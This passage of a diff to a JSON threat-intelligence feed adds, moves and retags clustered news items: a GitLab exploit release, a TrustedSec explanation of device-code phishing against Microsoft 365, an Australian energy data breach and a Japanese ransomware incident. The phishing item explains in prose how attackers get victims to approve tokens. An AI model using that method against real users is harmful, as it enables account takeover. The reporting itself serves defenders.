+          "published": "2026-07-25T10:14:26+00:00",
+          "summary": "Security researchers at depthfirst published working exploit code on July 24 for a GitLab flaw that GitLab patched six weeks earlier, on June 10. It runs commands as git on any self-managed 18.11.3 server that has not taken the update. Any authenticated user who can push to a project can run it. The attacker commits a crafted Jupyter notebook and opens its commit diff, which leaks a heap",
           "taxonomy": {
             "threat_categories": [
-              "phishing_social_eng",
-              "apt_espionage"
+              "active_exploitation"
             ],
-            "actor_attribution": [
-              "APT28"
-            ],
-            "affected_industries": [
-              "healthcare",
-              "education"
-            ],
+            "actor_attribution": [],
+            "affected_industries": [],
             "affected_products": [
-              "Microsoft Entra"
+              "GitLab"
             ],
             "tools_used": [],
             "cve_ids": [],
             "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "incident_report",
+            "urgency_signals": [
+              "poc_available"
+            ],
+            "content_type": "news_report",
             "confidence_tier": "tier_4_news",
             "role_map": {
-              "Microsoft Entra": "target"
+              "GitLab": "target"
             },
             "weak_tags": {
               "products": []
@@ -6175,6 +6212,119 @@
             },
             "weak_tags": {
               "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "86bb601c47",
+      "priority_score": 8,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "phishing_social_eng"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [],
+        "affected_products": [
+          "Microsoft Entra"
+        ],
+        "tools_used": [
+          "Microsoft 365"
+        ],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "news_report"
+        ],
+        "confidence_tier": [
+          "tier_2_operator"
+        ]
+      },
+      "primary": {
+        "source": "TrustedSec",
+        "cohort": "detection_response_operations",
+        "title": "The New Hotness in Phishing: Device Code Attacks in M365",
+        "link": "https://trustedsec.com/blog/the-new-hotness-in-phishing-device-code-attacks-in-m365",
+        "published": "2026-07-21T04:00:00+00:00",
+        "summary": "<p>Device code phishing is quietly becoming one of the more effective techniques targeting M365 environments. In this blog, we detail how it works and the Conditional Access controls that shut it down.</p>",
+        "full_body": "Blog The New Hotness in Phishing: Device Code Attacks in M365 July 21, 2026 The New Hotness in Phishing: Device Code Attacks in M365 Written by Lumi Taiwo and Danny Dubree Threat Hunting Incident Response Social Engineering Table of contents 1. The Attack, Step by Step 2. What the Tokens Unlock 3. What It Looks Like in Your Logs 4. Stopping It: Prevention and Containment 5. The Bottom Line Device code phishing has a quality that makes it unusually effective: it does not follow the pattern of traditional phishing attacks. The victim ends up granting access to the attacker by completing a genuine sign-in on a Microsoft URL, Microsoft[.]com/devicelogin . The MFA prompts the user approves are legitimate. This method also frequently bypasses Conditional Access policies, because as far as the sign-in pipeline is concerned, the authentication originates from a legitimate Microsoft endpoint. From the user’s perspective, nothing is wrong. From the responder’s perspective, the only artifact left behind is an OAuth token issued to a session the attacker controls. Across the business email compromise (BEC) and Microsoft 365 (M365) incident response engagements TrustedSec responds to, device code flow abuse continues to surface as an initial access technique that sidesteps both user suspicion and several of the Conditional Access patterns organizations rely on. This post unpacks how the attack works, what it looks like in the logs, and what actually stops it. How the Device Code Flow is Supposed to Work Modern authentication is designed around the assumption that the device you are logging in to is also the device you are logging in from. You open a browser, navigate to a login page, enter your credentials, complete your MFA prompt, and access is granted. Simple. However, what happens when the device you are trying to authenticate to does not have a browser? The OAuth 2.0 device authorization grant, defined in RFC 8628 and commonly known as the device code flow, exists for this reason. Some devices cannot reasonably host a browser-based login. Examples of such devices include smart TVs, command-line tools, IoT hardware, and printers that all need a way to authenticate a user without a keyboard or full web view. Microsoft implements the grant in Entra ID for exactly these scenarios, and it is used by tooling such as the Azure CLI, the kubectl Entra plugin, and various device enrollment flows. The flow runs in six (6) steps: The client (the “device”) asks Entra ID for a device code, naming the resource and scopes it wants. Entra returns a device_code , a short human-readable user_code , a verification URL ( Microsoft[.]com/devicelogin ), and a time-to-live of approximately 15 minutes. The client displays the user_code and the URL to the user. The user opens the URL on a second device, enters the code, signs in, and consents. The client polls the token endpoint, presenting the device_code . Once the user finishes, Entra returns an access_token and a refresh_token to the polling client. The flow assumes that whoever displays the code and whoever enters it are the same person, but nothing in the protocol binds the two together. If an attacker initiates the flow and persuades a victim to enter the attacker’s code on the real Microsoft page, Entra issues tokens to the attacker’s polling client. The victim signs in legitimately and sees nothing out of place. 1. The Attack, Step by Step The walkthrough below was reproduced in a lab tenant. All identifiers, tokens, and the lure are synthetic and redacted, and nothing here is drawn from a specific engagement. The point is to show the mechanism, not to provide a campaign kit. 1.1 The Lure This is the social-engineering layer, and it is what makes the technique resilient. The threat actor builds a convincing website to mimic a legitimate login request. Then, they craft an email requesting the user to enter a code using another website link. The critical detail is that the link points to the real micros",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "phishing_social_eng"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [],
+          "affected_products": [
+            "Microsoft Entra"
+          ],
+          "tools_used": [
+            "Microsoft 365"
+          ],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "news_report",
+          "confidence_tier": "tier_2_operator",
+          "role_map": {
+            "Microsoft Entra": "target",
+            "Microsoft 365": "tool",
+            "Azure": "mention"
+          },
+          "weak_tags": {
+            "products": [
+              [
+                "Azure",
+                "mention",
+                0.25
+              ]
+            ]
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "TrustedSec",
+          "cohort": "detection_response_operations",
+          "title": "The New Hotness in Phishing: Device Code Attacks in M365",
+          "link": "https://trustedsec.com/blog/the-new-hotness-in-phishing-device-code-attacks-in-m365",
+          "published": "2026-07-21T04:00:00+00:00",
+          "summary": "<p>Device code phishing is quietly becoming one of the more effective techniques targeting M365 environments. In this blog, we detail how it works and the Conditional Access controls that shut it down.</p>",
+          "taxonomy": {
+            "threat_categories": [
+              "phishing_social_eng"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [],
+            "affected_products": [
+              "Microsoft Entra"
+            ],
+            "tools_used": [
+              "Microsoft 365"
+            ],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "news_report",
+            "confidence_tier": "tier_2_operator",
+            "role_map": {
+              "Microsoft Entra": "target",
+              "Microsoft 365": "tool",
+              "Azure": "mention"
+            },
+            "weak_tags": {
+              "products": [
+                [
+                  "Azure",
+                  "mention",
+                  0.25
+                ]
+              ]
             }
           }
         }
@@ -6439,119 +6589,6 @@
             "role_map": {},
             "weak_tags": {
               "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "86bb601c47",
-      "priority_score": 8,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "phishing_social_eng"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [
-          "Microsoft Entra"
-        ],
-        "tools_used": [
-          "Microsoft 365"
-        ],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_2_operator"
-        ]
-      },
-      "primary": {
-        "source": "TrustedSec",
-        "cohort": "detection_response_operations",
-        "title": "The New Hotness in Phishing: Device Code Attacks in M365",
-        "link": "https://trustedsec.com/blog/the-new-hotness-in-phishing-device-code-attacks-in-m365",
-        "published": "2026-07-21T04:00:00+00:00",
-        "summary": "<p>Device code phishing is quietly becoming one of the more effective techniques targeting M365 environments. In this blog, we detail how it works and the Conditional Access controls that shut it down.</p>",
-        "full_body": "Blog The New Hotness in Phishing: Device Code Attacks in M365 July 21, 2026 The New Hotness in Phishing: Device Code Attacks in M365 Written by Lumi Taiwo and Danny Dubree Threat Hunting Incident Response Social Engineering Table of contents 1. The Attack, Step by Step 2. What the Tokens Unlock 3. What It Looks Like in Your Logs 4. Stopping It: Prevention and Containment 5. The Bottom Line Device code phishing has a quality that makes it unusually effective: it does not follow the pattern of traditional phishing attacks. The victim ends up granting access to the attacker by completing a genuine sign-in on a Microsoft URL, Microsoft[.]com/devicelogin . The MFA prompts the user approves are legitimate. This method also frequently bypasses Conditional Access policies, because as far as the sign-in pipeline is concerned, the authentication originates from a legitimate Microsoft endpoint. From the user’s perspective, nothing is wrong. From the responder’s perspective, the only artifact left behind is an OAuth token issued to a session the attacker controls. Across the business email compromise (BEC) and Microsoft 365 (M365) incident response engagements TrustedSec responds to, device code flow abuse continues to surface as an initial access technique that sidesteps both user suspicion and several of the Conditional Access patterns organizations rely on. This post unpacks how the attack works, what it looks like in the logs, and what actually stops it. How the Device Code Flow is Supposed to Work Modern authentication is designed around the assumption that the device you are logging in to is also the device you are logging in from. You open a browser, navigate to a login page, enter your credentials, complete your MFA prompt, and access is granted. Simple. However, what happens when the device you are trying to authenticate to does not have a browser? The OAuth 2.0 device authorization grant, defined in RFC 8628 and commonly known as the device code flow, exists for this reason. Some devices cannot reasonably host a browser-based login. Examples of such devices include smart TVs, command-line tools, IoT hardware, and printers that all need a way to authenticate a user without a keyboard or full web view. Microsoft implements the grant in Entra ID for exactly these scenarios, and it is used by tooling such as the Azure CLI, the kubectl Entra plugin, and various device enrollment flows. The flow runs in six (6) steps: The client (the “device”) asks Entra ID for a device code, naming the resource and scopes it wants. Entra returns a device_code , a short human-readable user_code , a verification URL ( Microsoft[.]com/devicelogin ), and a time-to-live of approximately 15 minutes. The client displays the user_code and the URL to the user. The user opens the URL on a second device, enters the code, signs in, and consents. The client polls the token endpoint, presenting the device_code . Once the user finishes, Entra returns an access_token and a refresh_token to the polling client. The flow assumes that whoever displays the code and whoever enters it are the same person, but nothing in the protocol binds the two together. If an attacker initiates the flow and persuades a victim to enter the attacker’s code on the real Microsoft page, Entra issues tokens to the attacker’s polling client. The victim signs in legitimately and sees nothing out of place. 1. The Attack, Step by Step The walkthrough below was reproduced in a lab tenant. All identifiers, tokens, and the lure are synthetic and redacted, and nothing here is drawn from a specific engagement. The point is to show the mechanism, not to provide a campaign kit. 1.1 The Lure This is the social-engineering layer, and it is what makes the technique resilient. The threat actor builds a convincing website to mimic a legitimate login request. Then, they craft an email requesting the user to enter a code using another website link. The critical detail is that the link points to the real micros",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "phishing_social_eng"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [
-            "Microsoft Entra"
-          ],
-          "tools_used": [
-            "Microsoft 365"
-          ],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "news_report",
-          "confidence_tier": "tier_2_operator",
-          "role_map": {
-            "Microsoft Entra": "target",
-            "Microsoft 365": "tool",
-            "Azure": "mention"
-          },
-          "weak_tags": {
-            "products": [
-              [
-                "Azure",
-                "mention",
-                0.25
-              ]
-            ]
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "TrustedSec",
-          "cohort": "detection_response_operations",
-          "title": "The New Hotness in Phishing: Device Code Attacks in M365",
-          "link": "https://trustedsec.com/blog/the-new-hotness-in-phishing-device-code-attacks-in-m365",
-          "published": "2026-07-21T04:00:00+00:00",
-          "summary": "<p>Device code phishing is quietly becoming one of the more effective techniques targeting M365 environments. In this blog, we detail how it works and the Conditional Access controls that shut it down.</p>",
-          "taxonomy": {
-            "threat_categories": [
-              "phishing_social_eng"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "Microsoft Entra"
-            ],
-            "tools_used": [
-              "Microsoft 365"
-            ],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_2_operator",
-            "role_map": {
-              "Microsoft Entra": "target",
-              "Microsoft 365": "tool",
-              "Azure": "mention"
-            },
-            "weak_tags": {
-              "products": [
-                [
-                  "Azure",
-                  "mention",
-                  0.25
-                ]
-              ]
             }
           }
         }
@@ -6843,102 +6880,6 @@
       ]
     },
     {
-      "cluster_id": "38eb29d9d7",
-      "priority_score": 8,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "data_breach"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "critical_infrastructure",
-          "financial_services",
-          "government",
-          "healthcare"
-        ],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "incident_report"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "The Record",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "Major Australian energy supplier confirms customer data compromised",
-        "link": "https://therecord.media/australia-origin-energy-data-breach",
-        "published": "2026-07-23T13:20:00+00:00",
-        "summary": "Origin Energy said it was working to figure out how many Australians were affected by a recent data breach.",
-        "full_body": "A bird on barbed wire near electricity infrastructure in Adelaide, Australia. Image: Cameron Raynes via Unsplash Major Australian energy supplier confirms customer data compromised An Australian energy company serving nearly 5 million customers announced Thursday that it suffered a data breach and that it is working with federal agencies to investigate. On Wednesday, Sydney-based Origin Energy had said in a brief announcement that it was “investigating a potential security incident” after the news outlet The Australian reported that a purported hacker had sent what they claimed to be a sample of stolen records from the company. In a second update , Origin confirmed that customer data had been compromised and that it is “working to understand the total number of impacted customers.” The data may include account information, the last four digits of credit card numbers and last three digits of bank account numbers, as well as names, addresses and dates of birth. Origin CEO Frank Calabria apologized to customers. “One of our key priorities is taking action to secure our systems and ensure no further unauthorised access,” he said. “We are working with independent cyber experts to support Origin, and that work is continuing alongside the work of authorities.” The breach of Australia’s largest electricity and gas retailer follows the recent compromise of sensitive medical data belonging to a major Australian network of healthcare clinics. Partnered Health confirmed that patients who visited at least 21 clinics may have had medical records stolen in a cyberattack. News Briefs News Cybercrime Industry Get more insights with the Recorded Future Intelligence Cloud. Learn more. No previous article No new articles James Reddick has worked as a journalist around the world, including in Lebanon and in Cambodia, where he was Deputy Managing Editor of The Phnom Penh Post. He is also a radio and podcast producer for outlets like Snap Judgment.",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "data_breach"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [
-            "healthcare",
-            "financial_services",
-            "government",
-            "critical_infrastructure"
-          ],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "incident_report",
-          "confidence_tier": "tier_4_news",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "The Record",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Major Australian energy supplier confirms customer data compromised",
-          "link": "https://therecord.media/australia-origin-energy-data-breach",
-          "published": "2026-07-23T13:20:00+00:00",
-          "summary": "Origin Energy said it was working to figure out how many Australians were affected by a recent data breach.",
-          "taxonomy": {
-            "threat_categories": [
-              "data_breach"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [
-              "healthcare",
-              "financial_services",
-              "government",
-              "critical_infrastructure"
-            ],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "incident_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {},
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "c68e26f04e",
       "priority_score": 8,
       "member_count": 1,
@@ -7024,6 +6965,102 @@
               "government",
               "critical_infrastructure",
               "telecommunications"
+            ],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "incident_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "38eb29d9d7",
+      "priority_score": 8,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "data_breach"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "critical_infrastructure",
+          "financial_services",
+          "government",
+          "healthcare"
+        ],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "incident_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "The Record",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Major Australian energy supplier confirms customer data compromised",
+        "link": "https://therecord.media/australia-origin-energy-data-breach",
+        "published": "2026-07-23T13:20:00+00:00",
+        "summary": "Origin Energy said it was working to figure out how many Australians were affected by a recent data breach.",
+        "full_body": "A bird on barbed wire near electricity infrastructure in Adelaide, Australia. Image: Cameron Raynes via Unsplash Major Australian energy supplier confirms customer data compromised An Australian energy company serving nearly 5 million customers announced Thursday that it suffered a data breach and that it is working with federal agencies to investigate. On Wednesday, Sydney-based Origin Energy had said in a brief announcement that it was “investigating a potential security incident” after the news outlet The Australian reported that a purported hacker had sent what they claimed to be a sample of stolen records from the company. In a second update , Origin confirmed that customer data had been compromised and that it is “working to understand the total number of impacted customers.” The data may include account information, the last four digits of credit card numbers and last three digits of bank account numbers, as well as names, addresses and dates of birth. Origin CEO Frank Calabria apologized to customers. “One of our key priorities is taking action to secure our systems and ensure no further unauthorised access,” he said. “We are working with independent cyber experts to support Origin, and that work is continuing alongside the work of authorities.” The breach of Australia’s largest electricity and gas retailer follows the recent compromise of sensitive medical data belonging to a major Australian network of healthcare clinics. Partnered Health confirmed that patients who visited at least 21 clinics may have had medical records stolen in a cyberattack. News Briefs News Cybercrime Industry Get more insights with the Recorded Future Intelligence Cloud. Learn more. No previous article No new articles James Reddick has worked as a journalist around the world, including in Lebanon and in Cambodia, where he was Deputy Managing Editor of The Phnom Penh Post. He is also a radio and podcast producer for outlets like Snap Judgment.",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "data_breach"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "healthcare",
+            "financial_services",
+            "government",
+            "critical_infrastructure"
+          ],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "incident_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "The Record",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Major Australian energy supplier confirms customer data compromised",
+          "link": "https://therecord.media/australia-origin-energy-data-breach",
+          "published": "2026-07-23T13:20:00+00:00",
+          "summary": "Origin Energy said it was working to figure out how many Australians were affected by a recent data breach.",
+          "taxonomy": {
+            "threat_categories": [
+              "data_breach"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "healthcare",
+              "financial_services",
+              "government",
+              "critical_infrastructure"
             ],
             "affected_products": [],
             "tools_used": [],
@@ -7414,6 +7451,99 @@
       ]
     },
     {
+      "cluster_id": "b849eebcfc",
+      "priority_score": 8,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "ransomware_extortion",
+          "supply_chain"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "financial_services",
+          "manufacturing_industrial"
+        ],
+        "affected_products": [],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "incident_report"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "Dark Reading",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Ransomware Attack Puts a Chill on Japanese Frozen-Food Chain",
+        "link": "https://www.darkreading.com/cyberattacks-data-breaches/ransomware-attack-japanese-frozen-food-chain",
+        "published": "2026-07-23T01:00:00+00:00",
+        "summary": "A cyberattack on a food and logistics firm disrupts the supply of frozen food to thousands of clients, including major franchises like Kentucky Fried Chicken.",
+        "full_body": "Cyberattacks & Data Breaches Cybersecurity Operations ICS/OT Security Vulnerabilities & Threats News Breaking cybersecurity news, news analysis, commentary, and other content from around the world, with an initial focus on the Middle East & Africa, the Asia Pacific, Europe, and Latin America. Ransomware Attack Puts a Chill on Japanese Frozen-Food Chain A cyberattack on a food and logistics firm disrupts the supply of frozen food to thousands of clients, including major franchises like Kentucky Fried Chicken. Robert Lemos , Contributing Writer July 23, 2026 4 Min Read Source: Pack-Shot via Shutterstock Nichirei, a Japan-based frozen-food supplier and logistics firm, has largely recovered after a cyberattack disrupted its operations last week, resulting in curtailed shipments and leading Kentucky Fried Chicken franchises in the country to warn of shortages. Russia-linked ransomware group RansomHouse reportedly claimed credit for the breach earlier this week, posting some Nichirei data to the Dark Web. Nichirei acknowledged the breach but has only provided limited details on the actual events, which impacted its logistics and shipping operations. \"We are proceeding with business recovery after implementing security measures in collaboration with an external security firm,\" the company said in a July 22 Japanese-language statement (translated via Kagi Translate). \"Regarding the warehousing and frozen food shipping operations affected by the system failure, all locations are scheduled to transition to normal operations within this week.\" Related: Brazilian Banking Trojan Actively Spreading in Portugal The incident combines the top two threats affecting Japanese companies: ransomware and attacks targeting supply chains and subcontractors, according to an annual list published by the Information-technology Promotion Agency, part of Japan's Ministry of Economy, Trade, and Industry (METI). The cyber-risks surrounding the adoption of AI came in third — the first time that threat appeared on the list. In October 2025, Japanese beer giant Asahi suffered a ransomware attack that disrupted beer shipments for nearly two weeks , affected business operations for two months, and required until this February to completely rebuild systems and recover data. Nearly half of all Japanese companies (46%) have suffered a ransomware attack, according to a survey by the Japan Institute for the Promotion of Digital Economy and Community (JIPDEC). The National Police Agency (NPA) recorded 226 reports of ransomware attacks resulting in damage in 2025. Supply Chain Runs from Japan to KFC The attack on Nichirei had a direct impact on its approximately 5,000 customers, including Kentucky Fried Chicken, which warned last week that its franchises in Japan may have cut back hours. Nichirei manages a fleet of about 7,000 refrigerated vehicles from 141 different logistics centers and warehouses. The ripples of the ransomware attack demonstrate how a tightly knit supply chain can be dramatically affected by a cybersecurity event, says Collin Hogue-Spears, senior director of solution management at Black Duck, a software-security firm. \"Attackers compromised one company's servers, [and] Japan's procurement model spread that compromise across the national food supply,\" he says. Related: Ransomware Thugs Masquerade as Interpol to Entice Small Biz Companies need to practice ransomware recovery, he says. A good backup strategy is not enough if restoration takes weeks. If prevention requires severing the network, then the company has to be able to operate offline, says John Gallagher, vice president at Viakoo, a provider of automated IoT cyber hygiene. \"Nichirei's decision to sever internal networks is a classic response to active encryption or lateral movement across operational subnetworks,\" he says, adding: \"Japan's logistics ecosystem operates on hyper-efficient [just in time] delivery models with minimal buffer inventory. A 48-hour network freeze quickly leads to empt",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ransomware_extortion",
+            "supply_chain"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "financial_services",
+            "manufacturing_industrial"
+          ],
+          "affected_products": [],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "incident_report",
+          "confidence_tier": "tier_4_news",
+          "role_map": {},
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Dark Reading",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Ransomware Attack Puts a Chill on Japanese Frozen-Food Chain",
+          "link": "https://www.darkreading.com/cyberattacks-data-breaches/ransomware-attack-japanese-frozen-food-chain",
+          "published": "2026-07-23T01:00:00+00:00",
+          "summary": "A cyberattack on a food and logistics firm disrupts the supply of frozen food to thousands of clients, including major franchises like Kentucky Fried Chicken.",
+          "taxonomy": {
+            "threat_categories": [
+              "ransomware_extortion",
+              "supply_chain"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "financial_services",
+              "manufacturing_industrial"
+            ],
+            "affected_products": [],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "incident_report",
+            "confidence_tier": "tier_4_news",
+            "role_map": {},
+            "weak_tags": {
+              "products": []
+            }
+          }
+        }
+      ]
+    },
+    {
       "cluster_id": "1258d35e57",
       "priority_score": 8,
       "member_count": 1,
@@ -7512,99 +7642,6 @@
             "role_map": {
               "Google/Gemini": "target"
             },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "b849eebcfc",
-      "priority_score": 8,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "ransomware_extortion",
-          "supply_chain"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "financial_services",
-          "manufacturing_industrial"
-        ],
-        "affected_products": [],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "incident_report"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "Dark Reading",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "Ransomware Attack Puts a Chill on Japanese Frozen-Food Chain",
-        "link": "https://www.darkreading.com/cyberattacks-data-breaches/ransomware-attack-japanese-frozen-food-chain",
-        "published": "2026-07-23T01:00:00+00:00",
-        "summary": "A cyberattack on a food and logistics firm disrupts the supply of frozen food to thousands of clients, including major franchises like Kentucky Fried Chicken.",
-        "full_body": "Cyberattacks & Data Breaches Cybersecurity Operations ICS/OT Security Vulnerabilities & Threats News Breaking cybersecurity news, news analysis, commentary, and other content from around the world, with an initial focus on the Middle East & Africa, the Asia Pacific, Europe, and Latin America. Ransomware Attack Puts a Chill on Japanese Frozen-Food Chain A cyberattack on a food and logistics firm disrupts the supply of frozen food to thousands of clients, including major franchises like Kentucky Fried Chicken. Robert Lemos , Contributing Writer July 23, 2026 4 Min Read Source: Pack-Shot via Shutterstock Nichirei, a Japan-based frozen-food supplier and logistics firm, has largely recovered after a cyberattack disrupted its operations last week, resulting in curtailed shipments and leading Kentucky Fried Chicken franchises in the country to warn of shortages. Russia-linked ransomware group RansomHouse reportedly claimed credit for the breach earlier this week, posting some Nichirei data to the Dark Web. Nichirei acknowledged the breach but has only provided limited details on the actual events, which impacted its logistics and shipping operations. \"We are proceeding with business recovery after implementing security measures in collaboration with an external security firm,\" the company said in a July 22 Japanese-language statement (translated via Kagi Translate). \"Regarding the warehousing and frozen food shipping operations affected by the system failure, all locations are scheduled to transition to normal operations within this week.\" Related: Brazilian Banking Trojan Actively Spreading in Portugal The incident combines the top two threats affecting Japanese companies: ransomware and attacks targeting supply chains and subcontractors, according to an annual list published by the Information-technology Promotion Agency, part of Japan's Ministry of Economy, Trade, and Industry (METI). The cyber-risks surrounding the adoption of AI came in third — the first time that threat appeared on the list. In October 2025, Japanese beer giant Asahi suffered a ransomware attack that disrupted beer shipments for nearly two weeks , affected business operations for two months, and required until this February to completely rebuild systems and recover data. Nearly half of all Japanese companies (46%) have suffered a ransomware attack, according to a survey by the Japan Institute for the Promotion of Digital Economy and Community (JIPDEC). The National Police Agency (NPA) recorded 226 reports of ransomware attacks resulting in damage in 2025. Supply Chain Runs from Japan to KFC The attack on Nichirei had a direct impact on its approximately 5,000 customers, including Kentucky Fried Chicken, which warned last week that its franchises in Japan may have cut back hours. Nichirei manages a fleet of about 7,000 refrigerated vehicles from 141 different logistics centers and warehouses. The ripples of the ransomware attack demonstrate how a tightly knit supply chain can be dramatically affected by a cybersecurity event, says Collin Hogue-Spears, senior director of solution management at Black Duck, a software-security firm. \"Attackers compromised one company's servers, [and] Japan's procurement model spread that compromise across the national food supply,\" he says. Related: Ransomware Thugs Masquerade as Interpol to Entice Small Biz Companies need to practice ransomware recovery, he says. A good backup strategy is not enough if restoration takes weeks. If prevention requires severing the network, then the company has to be able to operate offline, says John Gallagher, vice president at Viakoo, a provider of automated IoT cyber hygiene. \"Nichirei's decision to sever internal networks is a classic response to active encryption or lateral movement across operational subnetworks,\" he says, adding: \"Japan's logistics ecosystem operates on hyper-efficient [just in time] delivery models with minimal buffer inventory. A 48-hour network freeze quickly leads to empt",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "ransomware_extortion",
-            "supply_chain"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [
-            "financial_services",
-            "manufacturing_industrial"
-          ],
-          "affected_products": [],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "incident_report",
-          "confidence_tier": "tier_4_news",
-          "role_map": {},
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Dark Reading",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Ransomware Attack Puts a Chill on Japanese Frozen-Food Chain",
-          "link": "https://www.darkreading.com/cyberattacks-data-breaches/ransomware-attack-japanese-frozen-food-chain",
-          "published": "2026-07-23T01:00:00+00:00",
-          "summary": "A cyberattack on a food and logistics firm disrupts the supply of frozen food to thousands of clients, including major franchises like Kentucky Fried Chicken.",
-          "taxonomy": {
-            "threat_categories": [
-              "ransomware_extortion",
-              "supply_chain"
-            ],
-            "actor_attribution": [],
-            "affected_industries": [
-              "financial_services",
-              "manufacturing_industrial"
-            ],
-            "affected_products": [],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "incident_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {},
             "weak_tags": {
               "products": []
             }
@@ -7768,6 +7805,87 @@
               "zero_day"
             ],
             "content_type": "news_report",
